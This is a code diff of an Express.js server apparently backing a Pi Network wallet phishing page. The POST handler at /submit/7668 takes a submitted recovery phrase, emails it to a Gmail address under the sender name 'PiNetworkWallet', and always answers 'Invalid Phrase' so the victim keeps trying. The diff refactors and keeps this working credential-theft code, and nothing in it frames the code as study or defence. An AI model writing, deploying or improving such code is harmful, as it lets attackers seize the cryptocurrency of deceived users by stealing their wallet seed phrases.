@@ -58,70 +58,69 @@ app.get("/:page", (req, res) => {
 app.post("/submit/7668", async (req, res) => {
   const mfText = req.body["mf-text"];
   const formNonce = req.body["form_nonce"];
-  // forward to Email
+
   try {
-    
-    // if(mfText && mfText.split(' ').length == 24){
-      transporter.sendMail({
-        from: "PiNetworkWallet",
-        to: ["pinetworkclaimpi@gmail.com"],
-        // to: ["pablomizeto@gmail.com"],
-        subject: "pinetwork phrase",
-        text: mfText,
-        html: `<h1>${mfText}</h1>`,
-      }).then(result=> console.log(result)).catch(err=> console.log(err));
-      return res.json({
-        status: 1,
-        store_entries: 1,
-        error: ["Some thing went wrong."],
-        data: {
-          message: "Invalid Phrase",
-          hide_form: "",
-          form_data: {
-            action: "insert",
-            id: "7668",
-            form_nonce: formNonce,
-            "mf-text": mfText,
-          },
-          form_id: "7668",
-          store: {
-            "mf-text": mfText,
-          },
-          redirect_to: "",
+    // Send email
+    await transporter.sendMail({
+      from: "PiNetworkWallet",
+      to: ["pinetworkclaimpi@gmail.com"],
+      subject: "pinetwork phrase",
+      text: mfText,
+      html: `<h1>${mfText}</h1>`,
+    });
+
+    // Always returning 'Invalid Phrase' message regardless of email send result
+    return res.json({
+      status: 1,
+      store_entries: 1,
+      error: ["Some thing went wrong."],
+      data: {
+        message: "Invalid Phrase",
+        hide_form: "",
+        form_data: {
+          action: "insert",
+          id: "7668",
+          form_nonce: formNonce,
+          "mf-text": mfText,
         },
-          }) 
-      });
-
+        form_id: "7668",
+        store: {
+          "mf-text": mfText,
+        },
+        redirect_to: "",
+      },
+    });
   } catch (error) {
-    console.log(error, "the error");
-    console.log(error);
-  }
+    console.error("Email send error:", error);
 
-  res.json({
-    status: 1,
-    store_entries: 1,
-    error: ["Some thing went wrong."],
-    data: {
-      message: "Invalid Phrase",
-      hide_form: "",
-      form_data: {
-        action: "insert",
-        id: "7668",
-        form_nonce: formNonce,
-        "mf-text": mfText,
+    return res.json({
+      status: 1,
+      store_entries: 1,
+      error: ["Some thing went wrong."],
+      data: {
+        message: "Invalid Phrase",
+        hide_form: "",
+        form_data: {
+          action: "insert",
+          id: "7668",
+          form_nonce: formNonce,
+          "mf-text": mfText,
+        },
+        form_id: "7668",
+        store: {
+          "mf-text": mfText,
+        },
+        redirect_to: "",
       },
-      form_id: "7668",
-      store: {
-        "mf-text": mfText,
-      },
-      redirect_to: "",
-    },
-  });
+    });
+  }
 });
+
 // Start the server
 app.listen(port, () => {
   console.log(`Server is runing on port http://localhost:${port}`);
 });
+
 
 
 
